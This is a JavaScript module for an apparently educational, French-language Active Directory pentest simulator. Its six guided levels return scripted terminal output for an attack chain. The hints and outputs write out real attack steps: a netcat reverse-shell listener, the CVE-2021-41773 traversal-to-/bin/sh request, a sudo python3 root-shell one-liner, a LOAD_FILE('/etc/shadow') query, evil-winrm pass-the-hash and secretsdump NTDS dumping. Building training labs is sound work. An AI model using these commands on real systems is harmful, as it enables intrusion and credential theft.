// ═══════════════════════════════════════════════════════════════════════════
//  Active Directory Pentest — 6 niveaux guidés
//  Chaîne : Recon → Enum AD → CVE-2021-41773 → PrivEsc → Pivot DB → DC pwned
//  Pure fonctions — pas de React.
// ═══════════════════════════════════════════════════════════════════════════

import { handleADCommand } from '../utils/adSimulator';

const c = (t, col) => ({ t, c: col });

// ── Configuration des niveaux ─────────────────────────────────────────────

export const AD_LEVELS = [
  {
    n: 1, id: 'recon',
    title: 'Reconnaissance réseau',
    mitre: 'T1046 — Network Service Discovery',
    intro: 'Cartographie le réseau 192.168.1.0/24. Identifie les hôtes actifs et les services exposés sur l\'Active Directory.',
  },
  {
    n: 2, id: 'enum',
    title: 'Énumération Active Directory',
    mitre: 'T1018 — Remote System Discovery',
    intro: 'Énumère le domaine AD corp.local via DNS et les outils spécialisés. Confirme la vulnérabilité CVE-2021-41773.',
  },
  {
    n: 3, id: 'exploit',
    title: 'Accès initial — CVE-2021-41773',
    mitre: 'T1190 — Exploit Public-Facing Application',
    intro: 'Exploite Apache 2.4.49 (Path Traversal + RCE via mod_cgi) pour obtenir un reverse shell en tant que www-data.',
  },
  {
    n: 4, id: 'privesc',
    title: 'Post-exploitation & PrivEsc',
    mitre: 'T1078 — Valid Accounts · T1548 — Abuse Elevation Control',
    intro: 'Élève tes privilèges de www-data à root via sudo python3 NOPASSWD, puis extrais les credentials de la base de données.',
  },
  {
    n: 5, id: 'pivot',
    title: 'Pivot — DB Server',
    mitre: 'T1021.001 — Remote Services · T1003 — Credential Dumping',
    intro: 'Connecte-toi au serveur MySQL (192.168.1.30) avec les credentials trouvés et extrais le hash NTLM Administrator.',
  },
  {
    n: 6, id: 'dc',
    title: 'Domain Controller — Pass-the-Hash',
    mitre: 'T1550.002 — Pass-the-Hash · T1003.003 — NTDS',
    intro: 'Utilise le hash NTLM Administrator pour te connecter au DC via evil-winrm sans mot de passe en clair, puis dump NTDS.dit.',
  },
];

export const MAX_AD_LEVEL = AD_LEVELS.length;

export function getADLevel(n) {
  return AD_LEVELS.find(l => l.n === n) || AD_LEVELS[0];
}

// ── État initial par niveau ───────────────────────────────────────────────

export function initialADProg(n) {
  const shapes = {
    1: { nmapNet: false, nmapSV: false, nmapFull: false },
    2: { dnsrecon: false, nikto: false, gobuster: false },
    3: { listener: false, shell: false },
    4: { checked: false, sudo: false, root: false, creds: false },
    5: { mysql: false, enumDB: false, hash: false },
    6: { winrm: false, domainAdmin: false, ntds: false },
  };
  return shapes[n] || {};
}

// ── Objectifs ─────────────────────────────────────────────────────────────

export function adObjectives(n, prog) {
  const defs = {
    1: [
      { key: 'nmapNet',  label: 'Découvrir les hôtes actifs  (nmap 192.168.1.0/24)' },
      { key: 'nmapSV',   label: 'Identifier les services AD  (nmap -sV 192.168.1.10)' },
      { key: 'nmapFull', label: 'Scan NSE complet — signature DC (nmap -sC -sV -p- 192.168.1.10)' },
    ],
    2: [
      { key: 'dnsrecon', label: 'Énumérer les SRV DNS  (dnsrecon -d corp.local -n 192.168.1.10 -t std)' },
      { key: 'nikto',    label: 'Scanner les vulnérabilités web  (nikto -h 192.168.1.10)' },
      { key: 'gobuster', label: 'Brute-force répertoires  (gobuster dir -u http://192.168.1.10 -w ...)' },
    ],
    3: [
      { key: 'listener', label: 'Préparer un listener TCP  (nc -lvnp 4444)' },
      { key: 'shell',    label: 'Obtenir le reverse shell  (python3 cve-2021-41773.py 192.168.1.10 4444)' },
    ],
    4: [
      { key: 'checked', label: 'Vérifier le contexte utilisateur  (id)' },
      { key: 'sudo',    label: 'Lister les commandes NOPASSWD  (sudo -l)' },
      { key: 'root',    label: 'Élever les privilèges à root  (sudo python3 -c ...)' },
      { key: 'creds',   label: 'Extraire les credentials DB  (cat /var/www/html/config.php)' },
    ],
    5: [
      { key: 'mysql',  label: 'Connexion MySQL  (mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss)' },
      { key: 'enumDB', label: 'Explorer les bases de données  (show databases; / show tables;)' },
      { key: 'hash',   label: 'Extraire le hash NTLM Administrator  (SELECT * FROM credentials)' },
    ],
    6: [
      { key: 'winrm',       label: 'Connexion evil-winrm via Pass-the-Hash' },
      { key: 'domainAdmin', label: 'Confirmer les droits Domain Admin  (whoami /all)' },
      { key: 'ntds',        label: 'Dump NTDS.dit — tous les hashes  (secretsdump.py ...)' },
    ],
  };
  return (defs[n] || []).map(d => ({ label: d.label, done: !!prog[d.key] }));
}

// ── Indices ───────────────────────────────────────────────────────────────

export function adHints(n) {
  const h = {
    1: [
      'nmap 192.168.1.0/24 → ping scan pour hôtes actifs',
      'nmap -sC -sV -p- 192.168.1.10 → scan complet NSE',
      'Ports 88 (Kerberos) + 389 (LDAP) + 3268 (GC) = signature DC',
      'SMB Signing required → NTLM Relay impossible, Pass-the-Hash préféré',
    ],
    2: [
      'dnsrecon -d corp.local -n 192.168.1.10 -t std → SRV records',
      'nikto -h 192.168.1.10 → détecte CVE-2021-41773 automatiquement',
      'gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt',
      'Zone Transfer AXFR → attendu REFUSED (bonne config DNS)',
    ],
    3: [
      'Ouvre le listener AVANT de lancer l\'exploit',
      'nc -lvnp 4444 → attend la connexion de la victime',
      'python3 cve-2021-41773.py 192.168.1.10 4444',
      'CVE-2021-41773 : Path Traversal /../../../bin/sh + mod_cgi = RCE',
    ],
    4: [
      'id → uid=33(www-data) = accès web limité',
      'sudo -l → cherche python3 NOPASSWD',
      'sudo python3 -c \'import os; os.system("/bin/bash")\'',
      'cat /var/www/html/config.php → credentials MySQL db_user:Str0ngP@ss',
    ],
    5: [
      'mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss',
      'use corp_db; show tables;',
      'SELECT * FROM credentials; → hash NTLM Administrator',
      'FILE privilege actif → SELECT LOAD_FILE(\'/etc/shadow\')',
    ],
    6: [
      'evil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee',
      'whoami /all → Domain Admins + Schema Admins',
      'secretsdump.py Administrator@192.168.1.100 -hashes :5f4dcc3b...',
      'krbtgt hash → Golden Ticket (persistance 10 ans)',
    ],
  };
  return h[n] || [];
}

// ── Prochaine étape guidée ────────────────────────────────────────────────

export function getADNextStep(n, prog) {
  const steps = {
    1: [
      { cond: !prog.nmapNet,  action: 'Terminal', explain: 'Scanne le réseau pour découvrir tous les hôtes actifs.', hint: 'nmap 192.168.1.0/24' },
      { cond: !prog.nmapSV,   action: 'Terminal', explain: 'Identifie les services et versions sur l\'Active Directory.', hint: 'nmap -sV 192.168.1.10' },
      { cond: !prog.nmapFull, action: 'Terminal', explain: 'Scan NSE complet — révèle la signature DC (Kerberos, LDAP, GC).', hint: 'nmap -sC -sV -p- 192.168.1.10' },
    ],
    2: [
      { cond: !prog.dnsrecon, action: 'Terminal', explain: 'Énumère les SRV records DNS du domaine corp.local.', hint: 'dnsrecon -d corp.local -n 192.168.1.10 -t std' },
      { cond: !prog.nikto,    action: 'Terminal', explain: 'Scanne automatiquement les CVE web sur le serveur Apache.', hint: 'nikto -h 192.168.1.10' },
      { cond: !prog.gobuster, action: 'Terminal', explain: 'Brute-force les répertoires cachés (/backup, /admin, /cgi-bin).', hint: 'gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt' },
    ],
    3: [
      { cond: !prog.listener, action: 'Terminal', explain: 'Ouvre un listener TCP pour recevoir le reverse shell.', hint: 'nc -lvnp 4444' },
      { cond: !prog.shell,    action: 'Terminal', explain: 'Lance l\'exploit CVE-2021-41773 contre l\'AD (Apache 2.4.49).', hint: 'python3 cve-2021-41773.py 192.168.1.10 4444' },
    ],
    4: [
      { cond: !prog.checked, action: 'Terminal', explain: 'Vérifie ton identité et tes groupes sur la machine compromise.', hint: 'id' },
      { cond: !prog.sudo,    action: 'Terminal', explain: 'Liste les commandes exécutables sans mot de passe.', hint: 'sudo -l' },
      { cond: !prog.root,    action: 'Terminal', explain: 'Exploite python3 NOPASSWD pour obtenir un shell root.', hint: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'" },
      { cond: !prog.creds,   action: 'Terminal', explain: 'Récupère les credentials MySQL dans le fichier de config Apache.', hint: 'cat /var/www/html/config.php' },
    ],
    5: [
      { cond: !prog.mysql,  action: 'Terminal', explain: 'Connecte-toi au DB Server avec les credentials trouvés.', hint: 'mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss' },
      { cond: !prog.enumDB, action: 'Terminal', explain: 'Explore les bases de données et tables disponibles.', hint: 'show databases;' },
      { cond: !prog.hash,   action: 'Terminal', explain: 'Extrais le hash NTLM Administrator de la table credentials.', hint: 'use corp_db; SELECT * FROM credentials;' },
    ],
    6: [
      { cond: !prog.winrm,       action: 'Terminal', explain: 'Connecte-toi au DC avec le hash NTLM (sans mot de passe clair).', hint: 'evil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee' },
      { cond: !prog.domainAdmin, action: 'Terminal', explain: 'Confirme tes droits Domain Admin et Schema Admins.', hint: 'whoami /all' },
      { cond: !prog.ntds,        action: 'Terminal', explain: 'Dump NTDS.dit pour extraire tous les hashes du domaine.', hint: 'secretsdump.py Administrator@192.168.1.100 -hashes :5f4dcc3b5aa765d61d8327deb882cf99' },
    ],
  };
  return (steps[n] || []).find(s => s.cond) || null;
}

// ── Handlers terminal ─────────────────────────────────────────────────────

export async function handleADTerm(n, prog, rawCmd, ctx = {}) {
  const cmd = rawCmd.trim();
  const lower = cmd.toLowerCase();
  const pr = ctx.prompt || 'kali';

  const ok = (lines, patch, notify = null, done = false, prompt = null) =>
    ({ lines, prog: { ...prog, ...patch }, notify, done, prompt });
  const noop = (lines, newEnv = null) =>
    ({ lines, prog, notify: null, done: false, prompt: null, envState: newEnv });

  if (lower === 'clear') return { lines: [], prog, notify: null, done: false, clear: true };

  // Le fallback LLM (hors-script) a besoin du niveau courant pour le contexte AD
  const actx = { ...ctx, levelN: n };

  switch (n) {
    case 1: return await level1(cmd, lower, prog, ok, noop, pr, actx);
    case 2: return await level2(cmd, lower, prog, ok, noop, pr, actx);
    case 3: return await level3(cmd, lower, prog, ok, noop, pr, actx);
    case 4: return await level4(cmd, lower, prog, ok, noop, pr, actx);
    case 5: return await level5(cmd, lower, prog, ok, noop, pr, actx);
    case 6: return await level6(cmd, lower, prog, ok, noop, pr, actx);
    default:
      const sim = await handleADCommand(rawCmd, actx);
      if (sim.handled) return { lines: sim.lines, prog, notify: null, done: false, envState: sim.envState };
      return noop([c('Niveau inconnu.', '#ff5555')]);
  }
}

// ─── Level 1 — Recon réseau ───────────────────────────────────────────────

async function level1(cmd, lower, prog, ok, noop, pr, ctx) {
  const isNmap = lower.startsWith('nmap');

  if (isNmap && (lower.includes('/24') || lower.includes('0/24') || lower.includes('-sn'))) {
    return ok([
      c('Starting Nmap 7.94SVN ( https://nmap.org )', '#5a8aaa'),
      c('Nmap scan report for 192.168.1.10  (Active Directory)  → open: 88,389,445,5985', '#00aaff'),
      c('Nmap scan report for 192.168.1.20  (Mail Server)       → open: 25,143,22', '#00aaff'),
      c('Nmap scan report for 192.168.1.30  (DB Server)         → filtered', '#4a6a7a'),
      c('Nmap scan report for 192.168.1.100 (Domain Controller) → filtered', '#4a6a7a'),
      c('', ''),
      c('2 hôtes directement accessibles : 192.168.1.10 et 192.168.1.20', '#ffd93d'),
      c('Prochaine étape : nmap -sV 192.168.1.10', '#5a8aaa'),
    ], { nmapNet: true }, '🔍 Réseau cartographié !');
  }

  if (isNmap && lower.includes('192.168.1.10')) {
    const isFull = (lower.includes('-sc') || lower.includes('-p-')) && lower.includes('-sv');
    if (isFull) {
      return ok([
        c('Starting Nmap 7.94SVN — scan complet (-sC -sV -p-)', '#5a8aaa'),
        c('PORT       STATE SERVICE         VERSION', '#ffd93d'),
        c('53/tcp     open  domain          Simple DNS Plus', '#7a9aaa'),
        c('88/tcp     open  kerberos-sec    Microsoft Windows Kerberos', '#00aaff'),
        c('389/tcp    open  ldap            Microsoft Windows AD LDAP (Domain: corp.local)', '#00aaff'),
        c('445/tcp    open  microsoft-ds    Windows Server 2019 Microsoft DS', '#00aaff'),
        c('3268/tcp   open  ldap            Microsoft Windows AD LDAP (Global Catalog)', '#00aaff'),
        c('3389/tcp   open  ms-wbt-server   Microsoft Terminal Services', '#7a9aaa'),
        c('5985/tcp   open  http            Microsoft HTTPAPI (WinRM)', '#00aaff'),
        c('', ''),
        c('smb-os-discovery: Windows Server 2019 Standard 17763 | FQDN: dc.corp.local', '#00ff41'),
        c('[+] Signature DC confirmée : 88 (Kerberos) + 389 (LDAP) + 3268 (Global Catalog)', '#00ff41'),
        c('[+] Domaine AD : corp.local  |  SMB Signing REQUIRED → NTLM Relay bloqué', '#ffd93d'),
      ], { nmapNet: true, nmapSV: true, nmapFull: true }, '✅ Signature DC identifiée !', true);
    }

    return ok([
      c('Starting Nmap 7.94SVN', '#5a8aaa'),
      c('PORT      STATE SERVICE', '#ffd93d'),
      c('88/tcp    open  kerberos-sec', '#00aaff'),
      c('389/tcp   open  ldap', '#00aaff'),
      c('445/tcp   open  microsoft-ds', '#00aaff'),
      c('3268/tcp  open  ldap (Global Catalog)', '#00aaff'),
      c('5985/tcp  open  http (WinRM)', '#00aaff'),
      c('', ''),
      c('[+] Active Directory identifié — OS: Windows Server 2019', '#00ff41'),
      c('Tip: nmap -sC -sV -p- 192.168.1.10  pour le scan NSE complet', '#ffd93d'),
    ], { nmapNet: true, nmapSV: true }, '🔍 Services AD identifiés !');
  }

  const sim = await handleADCommand(cmd, ctx);
  if (sim.handled) return { lines: sim.lines, prog, notify: null, done: false, envState: sim.envState };

  return noop([c('Usage: nmap 192.168.1.0/24   ou   nmap -sV 192.168.1.10   ou   nmap -sC -sV -p- 192.168.1.10', '#4a6a7a')]);
}

// ─── Level 2 — Énumération AD ────────────────────────────────────────────

async function level2(cmd, lower, prog, ok, noop, pr, ctx) {
  if (lower.startsWith('dnsrecon')) {
    return ok([
      c('[*] Performing General Enumeration of Domain: corp.local', '#00aaff'),
      c('[+] SOA  corp.local  → dc.corp.local', '#00ff41'),
      c('[+]  NS  corp.local  → dc.corp.local', '#00ff41'),
      c('[+] SRV  _kerberos._tcp.corp.local  → dc.corp.local:88', '#00ff41'),
      c('[+] SRV  _ldap._tcp.corp.local      → dc.corp.local:389', '#00ff41'),
      c('[+] SRV  _gc._tcp.corp.local        → dc.corp.local:3268', '#00ff41'),
      c('[-] Zone Transfer (AXFR) : REFUSED — configuration DNS correcte', '#ff5555'),
      c('', ''),
      c('[+] DC confirmé : dc.corp.local → 192.168.1.10', '#00ff41'),
      c('[+] Kerberos port 88 → AS-REP Roasting possible', '#ffd93d'),
    ], { dnsrecon: true }, '🔍 DNS énuméré !');
  }

  if (lower.startsWith('nikto')) {
    return ok([
      c('- Nikto v2.1.6', '#5a8aaa'),
      c('+ Target IP: 192.168.1.10  |  Target Port: 80', '#7a9aaa'),
      c('+ Server: Apache/2.4.49 (Ubuntu)', '#ffd93d'),
      c('+ /cgi-bin/ directory accessible — modules CGI actifs !', '#ff5555'),
      c('+ /backup/ : répertoire sensible sans authentification', '#ff5555'),
      c('+ /admin/  : panneau admin détecté', '#ff5555'),
      c('[!] CVE-2021-41773 : Apache 2.4.49 Path Traversal + RCE (CVSS 9.8)', '#ff5555'),
      c('[+] Module mod_cgi ACTIVÉ → exécution de code via /cgi-bin/', '#ff5555'),
      c('', ''),
      c('CRITIQUE : serveur vulnérable à CVE-2021-41773 !', '#ff5555'),
    ], { nikto: true }, '⚠ CVE-2021-41773 confirmée !');
  }

  if (lower.startsWith('gobuster') || lower.startsWith('feroxbuster') || lower.startsWith('dirb')) {
    return ok([
      c('===============================================================', '#4a6a7a'),
      c('Gobuster v3.5 — brute-forcing directories', '#5a8aaa'),
      c('===============================================================', '#4a6a7a'),
      c('/admin        (Status: 301) [Size: 318]', '#00aaff'),
      c('/backup       (Status: 200) [Size: 42069]', '#ff5555'),
      c('/cgi-bin/     (Status: 403) [Size: 278]', '#ffd93d'),
      c('/css          (Status: 301) [Size: 312]', '#4a6a7a'),
      c('/images       (Status: 301) [Size: 315]', '#4a6a7a'),
      c('', ''),
      c('[+] /backup/ accessible → db.sql.gz potentiel', '#ff5555'),
      c('[+] /cgi-bin/ → vecteur CVE-2021-41773 confirmé', '#ff5555'),
    ], { gobuster: true }, '📂 Répertoires découverts !',
      prog.dnsrecon && prog.nikto);
  }

  const sim = await handleADCommand(cmd, ctx);
  if (sim.handled) return { lines: sim.lines, prog, notify: null, done: false, envState: sim.envState };

  return noop([c('Commandes : dnsrecon | nikto | gobuster', '#4a6a7a')]);
}

// ─── Level 3 — Exploit CVE-2021-41773 ────────────────────────────────────

async function level3(cmd, lower, prog, ok, noop, pr, ctx) {
  if (lower.startsWith('nc') && (lower.includes('-l') || lower.includes('lvnp') || lower.includes('lnvp'))) {
    const port = cmd.match(/\d{4,5}/)?.[0] || '4444';
    return ok([
      c(`listening on [any] ${port} ...`, '#00ff41'),
      c('', ''),
      c('Listener TCP actif — en attente d\'une connexion entrante.', '#ffd93d'),
      c(`Lance l'exploit : python3 cve-2021-41773.py 192.168.1.10 ${port}`, '#5a8aaa'),
    ], { listener: true }, '🎧 Listener actif !');
  }

  if ((lower.startsWith('python3') || lower.startsWith('python')) &&
      (lower.includes('exploit') || lower.includes('cve') || lower.includes('41773') || lower.includes('rce'))) {
    return ok([
      c('[*] Envoi du payload CVE-2021-41773 vers 192.168.1.10:80...', '#00aaff'),
      c('[*] GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh', '#5a8aaa'),
      c('[*] POST data: echo; id', '#5a8aaa'),
      c('', ''),
      c('[+] RCE confirmée ! uid=33(www-data) gid=33(www-data)', '#00ff41'),
      c(`[+] Connexion entrante sur listener :${prog.listener ? '4444' : '4444'} ✓`, '#00ff41'),
      c('[+] REVERSE SHELL ÉTABLI → 10.0.0.1:4444', '#00ff41'),
      c('', ''),
      c('╔══════════════════════════════════════════════════╗', '#00aaff'),
      c('║  🏢 SHELL — Active Directory (192.168.1.10)     ║', '#00aaff'),
      c('╚══════════════════════════════════════════════════╝', '#00aaff'),
      c('  OS   : Ubuntu 20.04 / Apache 2.4.49', '#7a9aaa'),
      c('  User : www-data (uid=33)', '#7a9aaa'),
      c('', ''),
      c('Tape : id  pour vérifier le contexte puis sudo -l', '#ffd93d'),
    ], { listener: true, shell: true }, '🔓 Reverse shell obtenu !', true, 'shell');
  }

  const sim = await handleADCommand(cmd, ctx);
  if (sim.handled) return { lines: sim.lines, prog, notify: null, done: false, envState: sim.envState };

  return noop([c('Commandes : nc -lvnp 4444   |   python3 cve-2021-41773.py 192.168.1.10 4444', '#4a6a7a')]);
}

// ─── Level 4 — Post-exploitation & PrivEsc ───────────────────────────────

async function level4(cmd, lower, prog, ok, noop, pr, ctx) {
  if (lower === 'id' || lower === 'whoami') {
    const isRoot = pr === 'root';
    return ok([
      isRoot
        ? c('uid=0(root) gid=0(root) groups=0(root)', '#ff5555')
        : c('uid=33(www-data) gid=33(www-data) groups=33(www-data)', '#ffd93d'),
    ], { checked: true });
  }

  if (lower === 'sudo -l') {
    if (pr !== 'shell' && pr !== 'root') {
      return noop([c('sudo: this command is not available outside a shell session', '#ff5555')]);
    }
    return ok([
      c('Matching Defaults entries for www-data on ad-server:', '#7a9aaa'),
      c('  env_reset, mail_badpass, secure_path=...', '#7a9aaa'),
      c('', ''),
      c('User www-data may run the following commands on ad-server:', '#ffd93d'),
      c('    (root) NOPASSWD: /usr/bin/python3', '#ff5555'),
      c('', ''),
      c('→ python3 NOPASSWD détecté ! Escalade possible.', '#ff5555'),
      c("  sudo python3 -c 'import os; os.system(\"/bin/bash\")'", '#00aaff'),
    ], { checked: true, sudo: true }, '⚠ sudo python3 NOPASSWD trouvé !');
  }

  if (lower.startsWith('sudo python3') || lower.startsWith('sudo python ')) {
    if (!prog.sudo) {
      return noop([c('[!] Lance d\'abord sudo -l pour vérifier les permissions.', '#ff5555')]);
    }
    return ok([
      c('root@ad-server:# ', '#ff5555'),
      c('', ''),
      c('[+] PrivEsc réussie ! Contexte root obtenu.', '#00ff41'),
      c('uid=0(root) gid=0(root) groups=0(root)', '#ff5555'),
    ], { checked: true, sudo: true, root: true }, '👑 Root obtenu !', false, 'root');
  }

  if (lower.includes('cat') && (lower.includes('config.php') || lower.includes('config'))) {
    if (!prog.root) {
      return noop([c('[!] Obtiens d\'abord un shell root pour accéder aux fichiers sensibles.', '#ff5555')]);
    }
    return ok([
      c('<?php', '#cc88ff'),
      c("$_DVWA['db_server']   = 'db';", '#7a9aaa'),
      c("$_DVWA['db_user']     = 'db_user';", '#00ff41'),
      c("$_DVWA['db_password'] = 'Str0ngP@ss';", '#ff5555'),
      c("$_DVWA['db_database'] = 'corp_db';", '#7a9aaa'),
      c('?>', '#cc88ff'),
      c('', ''),
      c('[+] Credentials MySQL extraits : db_user / Str0ngP@ss', '#00ff41'),
      c('[+] DB Server : 192.168.1.30', '#ffd93d'),
    ], { checked: true, sudo: true, root: true, creds: true }, '🔑 Credentials DB extraits !', true);
  }

  if (lower.startsWith('find') || lower.startsWith('ls')) {
    return ok([
      c('/var/www/html/config.php     (44 bytes)', '#00aaff'),
      c('/var/www/html/.htpasswd      (38 bytes)', '#ffd93d'),
      c('/etc/shadow                  (1247 bytes)  ← lisible car root', '#ff5555'),
    ], {});
  }

  const sim = await handleADCommand(cmd, ctx);
  if (sim.handled) return { lines: sim.lines, prog, notify: null, done: false, envState: sim.envState };

  return noop([c('Commandes : id  |  sudo -l  |  sudo python3 -c ...  |  cat /var/www/html/config.php', '#4a6a7a')]);
}

// ─── Level 5 — Pivot DB Server ───────────────────────────────────────────

async function level5(cmd, lower, prog, ok, noop, pr, ctx) {
  if (lower.startsWith('mysql') && lower.includes('192.168.1.30')) {
    const hasUser = lower.includes('db_user');
    const hasPass = lower.includes('str0ngp@ss');
    if (!hasUser || !hasPass) {
      return noop([
        c('[ERROR 1045] Access denied — mauvais credentials.', '#ff5555'),
        c('Utilise : mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss', '#ffd93d'),
      ]);
    }
    return ok([
      c('Welcome to the MySQL monitor. Commands end with ; or \\g.', '#5a8aaa'),
      c('Your MySQL connection id is 42', '#7a9aaa'),
      c('Server version: 5.7.38 MySQL Community Server (GPL)', '#7a9aaa'),
      c('', ''),
      c('mysql> ', '#00aaff'),
      c('[+] Connecté au DB Server 192.168.1.30 en tant que db_user', '#00ff41'),
    ], { mysql: true }, '🗄 Connecté au DB Server !', false, 'mysql');
  }

  if (pr === 'mysql' || prog.mysql) {
    if (lower.includes('show databases') || lower.includes('show tables')) {
      return ok([
        c('+--------------------+', '#4a6a7a'),
        c('| Database           |', '#ffd93d'),
        c('+--------------------+', '#4a6a7a'),
        c('| corp_db            |', '#00aaff'),
        c('| employees          |', '#00aaff'),
        c('| information_schema |', '#7a9aaa'),
        c('+--------------------+', '#4a6a7a'),
        c('', ''),
        c('use corp_db → Tables: employees | users | credentials | secrets', '#ffd93d'),
      ], { mysql: true, enumDB: true }, '📋 Bases de données explorées !');
    }

    if (lower.includes('select') && (lower.includes('credentials') || lower.includes('*'))) {
      return ok([
        c('+---------------+--------------------------------------------------+', '#4a6a7a'),
        c('| username      | hash                                             |', '#ffd93d'),
        c('+---------------+--------------------------------------------------+', '#4a6a7a'),
        c('| Administrator | aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765  |', '#ff5555'),
        c('| svc_backup    | aad3b435b51404eeaad3b435b51404ee:e99a18c428cb38  |', '#ff5555'),
        c('+---------------+--------------------------------------------------+', '#4a6a7a'),
        c('', ''),
        c('[+] Hash NTLM Administrator extrait !', '#00ff41'),
        c('    aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99', '#ff5555'),
        c('[+] Pivot vers Domain Controller (192.168.1.100) maintenant possible', '#ffd93d'),
      ], { mysql: true, enumDB: true, hash: true }, '🔑 Hash NTLM extrait !', true);
    }

    if (lower.startsWith('use ')) {
      return ok([c('Database changed', '#00ff41')], { mysql: true, enumDB: true });
    }
  }

  const sim = await handleADCommand(cmd, ctx);
  if (sim.handled) return { lines: sim.lines, prog, notify: null, done: false, envState: sim.envState };

  return noop([c('Commandes : mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss   puis   show databases;   puis   SELECT * FROM credentials;', '#4a6a7a')]);
}

// ─── Level 6 — Domain Controller ─────────────────────────────────────────

async function level6(cmd, lower, prog, ok, noop, pr, ctx) {
  if (lower.startsWith('evil-winrm')) {
    const hasHash = lower.includes('-h') || lower.includes('aad3b') || lower.includes('5f4dcc');
    if (!hasHash) {
      return noop([
        c('[!] Spécifie le hash NTLM avec -H', '#ff5555'),
        c('evil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee', '#ffd93d'),
      ]);
    }
    return ok([
      c('                                        ', '#00aaff'),
      c('Evil-WinRM shell v3.5', '#00aaff'),
      c('', ''),
      c('Info: Establishing connection to remote endpoint', '#5a8aaa'),
      c('', ''),
      c('*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> ', '#00ff41'),
      c('', ''),
      c('[+] Connecté au Domain Controller 192.168.1.100 en tant qu\'Administrator', '#00ff41'),
      c('[+] Pass-the-Hash réussi — aucun mot de passe en clair nécessaire !', '#ffd93d'),
    ], { winrm: true }, '🔐 Connecté au DC via Pass-the-Hash !', false, 'winrm');
  }

  if (pr === 'winrm' || prog.winrm) {
    if (lower === 'whoami' || lower === 'whoami /all' || lower.includes('whoami')) {
      return ok([
        c('CORP\\Administrator', '#ff5555'),
        c('', ''),
        c('GROUP INFORMATION', '#ffd93d'),
        c('Group Name                           Type             SID', '#7a9aaa'),
        c('CORP\\Domain Admins                  Alias            S-1-5-21-...', '#ff5555'),
        c('CORP\\Schema Admins                  Alias            S-1-5-21-...', '#ff5555'),
        c('CORP\\Enterprise Admins              Alias            S-1-5-21-...', '#ff5555'),
        c('', ''),
        c('[+] Domain Admins + Schema Admins + Enterprise Admins confirmés', '#00ff41'),
        c('[+] Domaine CORP.LOCAL entièrement sous contrôle', '#ff5555'),
      ], { winrm: true, domainAdmin: true }, '👑 Domain Admin confirmé !');
    }

    if (lower.startsWith('secretsdump') || (lower.startsWith('python3') && lower.includes('secretsdump'))) {
      if (!prog.domainAdmin) {
        return noop([c('[!] Confirme d\'abord tes droits Domain Admin : whoami /all', '#ff5555')]);
      }
      return ok([
        c('[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', '#00aaff'),
        c('[*] Using the DRSUAPI method to get NTDS.DIT secrets', '#5a8aaa'),
        c('[*] Searching for pekList, be patient', '#5a8aaa'),
        c('', ''),
        c('Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::', '#ff5555'),
        c('Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', '#7a9aaa'),
        c('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2a3be40b5e5d33e84e8c3fecfb11c7c8:::', '#ff5555'),
        c('svc_backup:1103:aad3b435b51404eeaad3b435b51404ee:e99a18c428cb38d5f260853678922e03:::', '#ffd93d'),
        c('john:1104:aad3b435b51404eeaad3b435b51404ee:0d107d09f5bbe40cade3de5c71e9e9b7:::', '#ffd93d'),
        c('[*] ...47 comptes exportés', '#7a9aaa'),
        c('', ''),
        c('[+] krbtgt hash récupéré → Golden Ticket possible (persistance 10 ans)', '#ff5555'),
        c('[+] CORP.LOCAL → 47 comptes exposés. Domaine neutralisé.', '#ff5555'),
        c('', ''),
        c('🏆 FLAG FINAL : CQ{d0m41n_4dm1n_pwn3d}', '#ffd93d'),
      ], { winrm: true, domainAdmin: true, ntds: true }, '🏆 CORP.LOCAL compromis !', true);
    }

    if (lower === 'net user /domain' || lower.startsWith('net user')) {
      return ok([
        c('The request will be processed at a domain controller for domain CORP.LOCAL', '#7a9aaa'),
        c('', ''),
        c('User accounts for \\\\DC', '#ffd93d'),
        c('Administrator  Guest  krbtgt  john  svc_backup  svc_sql  helpdesk  ...', '#00aaff'),
        c('The command completed successfully.', '#00ff41'),
      ], { winrm: true });
    }
  }

  const sim = await handleADCommand(cmd, ctx);
  if (sim.handled) return { lines: sim.lines, prog, notify: null, done: false, envState: sim.envState };

  return noop([c('Commandes : evil-winrm -i 192.168.1.100 -u Administrator -H <hash>  |  whoami /all  |  secretsdump.py ...', '#4a6a7a')]);
}
